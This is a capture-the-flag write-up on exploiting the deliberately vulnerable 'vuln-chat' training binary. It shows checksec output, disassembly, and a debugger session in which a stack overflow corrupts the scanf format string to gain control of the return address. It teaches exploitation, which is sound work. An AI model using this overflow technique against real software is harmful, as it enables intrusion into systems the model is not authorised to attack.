# Soln

`checksec` shows the only harden is `NX`:

```sh
❯ pwn checksec --file=vuln-chat
[*] '/home/pwent/code/personal/Linux_ED/Nightmare/pwn/vuln-chat/vuln-chat'
    Arch:       i386-32-little
    RELRO:      No RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
```

`nm ./vuln-chat` shows an interesting function:

- `0804856b T printFlag`

`printFlag` isn't called directly.

`printFlag` calls `system` with "/bin/cat ./flag.txt":

`objdump -D ./vuln-chat -M intel | less`

```sh
0804856b <printFlag>:
 804856b:       55                      push   ebp
 804856c:       89 e5                   mov    ebp,esp
 804856e:       68 f0 86 04 08          push   0x80486f0
 8048573:       e8 a8 fe ff ff          call   8048420 <system@plt>
 8048578:       83 c4 04                add    esp,0x4
 804857b:       68 04 87 04 08          push   0x8048704
 8048580:       e8 8b fe ff ff          call   8048410 <puts@plt>
 8048585:       83 c4 04                add    esp,0x4
 8048588:       c9                      leave
 8048589:       c3                      ret
```

Where `0x80486f0` is:

```sh
Contents of section .rodata:
 80486e8 03000000 01000200 2f62696e 2f636174  ......../bin/cat
 80486f8 202e2f66 6c61672e 74787400 55736520   ./flag.txt.
```

`main` shows two calls to `scanf` into static length arrays.

From Ghidra:

```c

undefined4 main(void)

{
  undefined1 password [20];
  undefined1 name [20];
  undefined4 fmt;
  undefined1 local_5;
  
  setvbuf(stdout,NULL,2,0x14);
  puts("----------- Welcome to vuln-chat -------------");
  printf("Enter your username: ");
  fmt = L'\x73303325';
  local_5 = 0;
  __isoc99_scanf(&fmt,name);
  printf("Welcome %s!\n",name);
  puts("Connecting to \'djinn\'");
  sleep(1);
  puts("--- \'djinn\' has joined your chat ---");
  puts("djinn: I have the information. But how do I know I can trust you?");
  printf("%s: ",name);
  __isoc99_scanf(&fmt,password);
  puts("djinn: Sorry. That\'s not good enough");
  fflush(stdout);
  return 0;
}
```

Where `fmt` is: `%30s`:

```sh
00:0000│ esp 0xffffcce0 —▸ 0xffffcd13 ◂— '%30s'
```

The stack is laid out as follows:

```sh
undefined4        Stack[-0x9]:4  fmt
undefined1[20]    Stack[-0x1d]   name
undefined1[20]    Stack[-0x31]   password
```

So we can overflow name by 10 and password by 10.

That's only useful for `name` due to the stack layout and 10 bytes of overflow isn't enough to reach
the saved return pointer 4 for `fmt`, 4 for saved RBP, 2 for LSB of saved RIP.

But if we corrupt `fmt` on the first overflow, the second overflow at `password` can overflow much
further.

For example, if we set `fmt` to `%53s`, we get RIP control when we input `password`:

```sh
pwndbg> c
Continuing.
----------- Welcome to vuln-chat -------------
Enter your username: AAAAAAAAAAAAAAAAAAAA%53s
Welcome AAAAAAAAAAAAAAAAAAAA%53s!
Connecting to 'djinn'
--- 'djinn' has joined your chat ---
djinn: I have the information. But how do I know I can trust you?
AAAAAAAAAAAAAAAAAAAA%53s: CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
djinn: Sorry. That's not good enough

Program received signal SIGSEGV, Segmentation fault.
0x43434343 in ?? ()
```

Note the 20 `"A"`s is the difference between `name` and `fmt` in the stack layout:

`0x1d - 0x9 = 0x14`

Note I found `49+4=53` for the second payload using `pwn cyclic`.
